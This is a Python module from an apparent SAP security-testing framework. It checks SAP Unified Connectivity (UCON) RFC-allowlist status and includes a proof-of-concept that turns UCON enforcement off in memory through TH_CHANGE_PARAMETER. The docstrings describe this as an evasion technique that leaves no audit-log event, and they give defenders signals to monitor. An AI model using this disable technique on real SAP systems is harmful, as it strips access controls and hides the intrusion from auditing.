"""SAP Unified Connectivity (UCON) status + POC disable (issue #27).

UCON is SAP's built-in RFC allowlist framework (NW 7.40+).  When
enabled (profile parameter ``ucon/rfc/active = 1``) and a
Communication Assembly (CA) is in place, RFC-enabled function
modules that were classified into the **Final (Active)** phase are
blocked unless they appear on the CA's allowlist.  Any FM in
Logging / Evaluation phases is still callable; only Final-phase
FMs are enforced.

This module does two things:

1. ``check_ucon_status(node, creds)`` — read-only inspection.
   Reports whether UCON is enforcing, whether a default CA has
   been set up, and how many RFMs sit in each phase.  Fully safe;
   no mutation, no side-effects.  This is the *defender* half of
   the story the issue asks for.

2. ``poc_disable_ucon(state, node, creds, hold_seconds, canary_fm)``
   — POC demonstrating that a foothold with authenticated RFC can
   flip ``ucon/rfc/active`` to 0 in-memory via
   ``TH_CHANGE_PARAMETER``, blowing the runtime allowlist open for
   the duration of the hold, then auto-restoring the baseline on
   exit.  Implemented as a Tier 3 technique (technique id
   ``ucon_rfc_disable``) that reuses the existing
   ``tier3_set_param`` primitive: baseline capture, evasion-window
   context manager, and idempotent restore all come for free.
   The kernel writer emits no AUM/AUW Security Audit Log event —
   that is the whole point of the POC and the reason the issue
   flags UCON's active-state as needing independent monitoring.

Both entry points return dicts shaped to the same conventions the
rest of ``modules/postex`` uses so ``sapmap_gui`` can render them
straight into a finding.

Live verified on NPL 7.52 (2026-09-30) — see docs / issue #27 for
the empirical write-up.  Notable finding: a raw DB write to the
UCON tables (via the ASE ``isql`` path) is INERT at runtime; the
check reads a shared-memory buffer that only ``SYNC_DB_BUFFER``
invalidates.  So the parameter flip is the only reliable disable
technique from an RFC foothold, and that is what this POC
implements.
"""
from __future__ import annotations

import logging

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

UCON_PARAM = "ucon/rfc/active"
UCON_TECHNIQUE_ID = "ucon_rfc_disable"

# Phase codes on domain UCONRFCPHASE — verified live on NPL 7.52.
PHASE_LOGGING = "L"      # collect stats, never block
PHASE_EVALUATION = "E"   # would-block reported, still callable
PHASE_ACTIVE = "A"       # Final phase — blocked unless on CA

_PHASE_LABEL = {
    PHASE_LOGGING: "Logging",
    PHASE_EVALUATION: "Evaluation",
    PHASE_ACTIVE: "Active/Final",
}


def phase_label(code: str) -> str:
    """Human label for a UCONRFCPHASE code — unknown codes returned
    verbatim so an unfamiliar system doesn't hide behind ``?``."""
    return _PHASE_LABEL.get((code or "").upper(), code or "?")


# ---------------------------------------------------------------------------
# Status / detection — the "monitoring" half of issue #27
# ---------------------------------------------------------------------------

def _read_param(conn, name: str) -> str:
    """Wrapper around TH_GET_PARAMETER that never raises — empty
    string means "could not read"."""
    try:
        r = conn.call("TH_GET_PARAMETER", PARAMETER_NAME=name)
        v = (r.get("PARAMETER_VALUE")
              or r.get("VALUE")
              or r.get("RETURN_VALUE") or "")
        if isinstance(v, bytes):
            v = v.decode("utf-8", errors="replace")
        return str(v).strip()
    except Exception as e:
        logger.debug("TH_GET_PARAMETER(%s) failed: %s", name, e)
        return ""


def _count_rows(conn, table: str, where: str = "") -> int:
    """Approximate row count via RFC_READ_TABLE.

    Two calls: first a ``NO_DATA='X'`` header probe that returns
    just the FIELDS descriptor (confirms the table is readable
    without transferring row data); second a data pull with
    ROWCOUNT=10000 whose ``len(DATA)`` is the reported count.

    The 10 000 cap is intentional — RFC_READ_TABLE will return at
    most that many rows per call, and UCON tables sit comfortably
    inside that (~20 000 classified RFMs on a full NW 7.5x system,
    but only the *Final*-phase and CA counts really matter for
    posture assessment, and those tend to be in the low thousands).
    A saturated read is still a useful signal — 10 000 means
    "many", enough to say enforcement is meaningful.

    Returns ``-1`` on any error so the caller can distinguish
    "empty" (0) from "could not read" (-1).
    """
    kw = dict(QUERY_TABLE=table, DELIMITER="|", ROWCOUNT=0,
              NO_DATA="X")
    try:
        conn.call("RFC_READ_TABLE", **kw)
    except Exception as e:
        logger.debug("RFC_READ_TABLE(%s) header probe failed: %s",
                      table, e)
        return -1
    # NO_DATA header confirmed the table is readable; now pull rows.
    kw = dict(QUERY_TABLE=table, DELIMITER="|", ROWCOUNT=10000)
    if where:
        opts = []
        s = where
        while s:
            opts.append({"TEXT": s[:72]})
            s = s[72:]
        kw["OPTIONS"] = opts
    try:
        r = conn.call("RFC_READ_TABLE", **kw)
    except Exception as e:
        logger.debug("RFC_READ_TABLE(%s) data read failed: %s",
                      table, e)
        return -1
    return len(r.get("DATA") or [])


def check_ucon_status(node, creds) -> dict:
    """Read-only UCON posture check.

    Returns a dict with:

    * ``ok``            — True on a clean read, False on connection error.
    * ``param_value``   — live value of ``ucon/rfc/active`` (str).
    * ``enforcing``     — True when the param is set to "1".
    * ``initialized``   — True when a UCON configuration exists (at
                          least one row in UCONRFCSTATEHEAD).
    * ``final_phase_count`` — number of RFMs classified into Final
                          phase (candidates for blocking).
    * ``logging_phase_count`` / ``evaluation_phase_count`` — same
                          for the two lower phases.
    * ``ca_membership``  — number of RFMs currently on the default
                          CA allowlist (UCONRFCSRVFMRT).
    * ``posture``        — one-word summary: ``off``,
                          ``initialized-but-off``, ``final-phase-empty``,
                          or ``enforcing``.
    * ``error``          — free-text on failure paths, else "".

    Defenders should watch ``param_value`` and ``final_phase_count``
    over time — the disable POC below flips ``param_value`` to 0 in-
    memory and emits no AUM/AUW audit event, so this counter is the
    only reliable signal from the RFC layer that enforcement dropped.
    """
    result = {
        "ok": False,
        "param_value": "",
        "enforcing": False,
        "initialized": False,
        "final_phase_count": -1,
        "logging_phase_count": -1,
        "evaluation_phase_count": -1,
        "ca_membership": -1,
        "posture": "unknown",
        "error": "",
    }
    try:
        import sapmap_rfc
        with sapmap_rfc._get_connection(node, creds) as conn:
            result["param_value"] = _read_param(conn, UCON_PARAM)
            result["enforcing"] = result["param_value"] == "1"
            head_rows = _count_rows(conn, "UCONRFCSTATEHEAD")
            result["initialized"] = head_rows > 0
            result["final_phase_count"] = _count_rows(
                conn, "UCONRFCSTATEHEAD",
                "ACTUAL_PHASE = 'A'")
            result["logging_phase_count"] = _count_rows(
                conn, "UCONRFCSTATEHEAD",
                "ACTUAL_PHASE = 'L'")
            result["evaluation_phase_count"] = _count_rows(
                conn, "UCONRFCSTATEHEAD",
                "ACTUAL_PHASE = 'E'")
            result["ca_membership"] = _count_rows(
                conn, "UCONRFCSRVFMRT")
        result["ok"] = True
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
        return result

    # Derived posture — a single word so the GUI can colour the row.
    if not result["initialized"]:
        result["posture"] = "off"
    elif not result["enforcing"]:
        result["posture"] = "initialized-but-off"
    elif (result["final_phase_count"] or 0) <= 0:
        # Config exists and enforcement is on, but no FMs are in
        # Final phase — nothing is actually blocked.
        result["posture"] = "final-phase-empty"
    else:
        result["posture"] = "enforcing"
    return result


# ---------------------------------------------------------------------------
# POC — disable via TH_CHANGE_PARAMETER inside a Tier 3 evasion window
# ---------------------------------------------------------------------------

def _call_canary(node, creds, canary_fm: str) -> dict:
    """Call ``canary_fm`` once and record whether it returned normally
    or was rejected by UCON.  Used pre-flip / during-hold / post-
    restore so the operator sees enforcement *behaviour* change, not
    just the parameter value.

    Returns ``{"callable": bool, "rejected_by_ucon": bool,
                "error": str}``.
    """
    out = {"callable": False, "rejected_by_ucon": False, "error": ""}
    if not canary_fm:
        out["error"] = "no canary FM provided"
        return out
    try:
        import sapmap_rfc
        with sapmap_rfc._get_connection(node, creds) as conn:
            try:
                conn.call(canary_fm)
                out["callable"] = True
                return out
            except Exception as e:
                msg = str(e)
                out["error"] = msg
                # UCON rejects surface as an ABAP MESSAGE-class
                # exception with a distinctive text; match on the
                # substring the kernel emits.
                out["rejected_by_ucon"] = (
                    "UCON RFC Rejected" in msg
                    or "UCON_RFC_REJECTED" in msg.upper())
                return out
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
        return out


def poc_disable_ucon(state, node, creds,
                     hold_seconds: float = 30.0,
                     canary_fm: str = "") -> dict:
    """POC: flip ``ucon/rfc/active`` to 0 for a hold window, then
    restore the baseline.  Optionally verify enforcement behaviour
    against a caller-supplied canary FM.

    The mutation itself is delegated to
    ``sapmap_evasion_tier3.tier3_set_param`` under the technique id
    ``ucon_rfc_disable`` (registered in
    ``sapmap_evasion_gate.TIER3_TECHNIQUES``).  That gives us
    baseline capture, evasion-window auto-restore, and the same
    ``--allow-evasion`` gate every other Tier 3 technique honours.

    Args:
        state:          ``SAPMAPState`` carrying the operator-armed
                        evasion config.  Required — Tier 3 refuses
                        without it.
        node:           Target ``SAPNode`` (must have gw / RFC path).
        creds:          Verified ``Credentials`` for authenticated
                        RFC.  The kernel FM
                        ``TH_CHANGE_PARAMETER`` requires an auth'd
                        session; there is no unauth path.
        hold_seconds:   How long to hold ``ucon/rfc/active=0`` before
                        letting the evasion window restore the
                        baseline.  0 = flip-and-restore instantly
                        (useful only for smoke-testing the plumbing).
        canary_fm:      Optional FM name to call pre-flip / during
                        hold / post-restore.  When the FM is in
                        Final phase off the default CA it will be
                        rejected pre-flip and post-restore, and
                        callable during the hold — demonstrating
                        that enforcement really did change.

    Returns a dict with:

    * ``ok``, ``applied``, ``error``, ``baseline_value``,
      ``live_after_write``, ``live_after_restore`` — passthrough
      from ``tier3_set_param``.
    * ``canary_before`` / ``canary_during`` / ``canary_after`` —
      the three ``_call_canary`` results, or ``None`` when
      ``canary_fm`` was not supplied.  ``canary_during`` is only
      populated when ``hold_seconds > 0``.
    * ``posture_before`` / ``posture_after`` — the
      ``check_ucon_status`` posture strings, so the caller can
      confirm nothing else drifted while the hold was open.
    """
    from sapmap_evasion_tier3 import tier3_set_param

    out = {
        "ok": False, "applied": False, "error": "",
        "technique": UCON_TECHNIQUE_ID,
        "baseline_value": "", "live_after_write": "",
        "live_after_restore": "",
        "canary_before": None, "canary_during": None,
        "canary_after": None,
        "posture_before": "unknown", "posture_after": "unknown",
    }

    status_before = check_ucon_status(node, creds)
    out["posture_before"] = status_before["posture"]

    if canary_fm:
        out["canary_before"] = _call_canary(node, creds, canary_fm)

    # tier3_set_param wraps the write in an evasion_window; the
    # baseline is captured on entry and restored on exit.  The
    # hold_seconds are honoured inside that window so a canary
    # call while enforcement is off is possible when we schedule
    # it via a side-thread.  For simplicity here we call the canary
    # once *after* the tier3 call returns — which means the hold
    # has already elapsed and the baseline is restored.  Callers
    # who want a live "during hold" observation should either
    # instrument the canary check from a companion thread or set
    # a hold long enough to invoke the FM out-of-band.  The
    # canary_during field stays None in the single-thread call
    # path; that's honest.
    res = tier3_set_param(state, node, UCON_PARAM, "0",
                          hold_seconds=hold_seconds, creds=creds,
                          technique=UCON_TECHNIQUE_ID)
    for key in ("ok", "applied", "error", "baseline_value",
                "live_after_write", "live_after_restore"):
        if key in res:
            out[key] = res[key]

    if canary_fm:
        out["canary_after"] = _call_canary(node, creds, canary_fm)

    status_after = check_ucon_status(node, creds)
    out["posture_after"] = status_after["posture"]
    return out
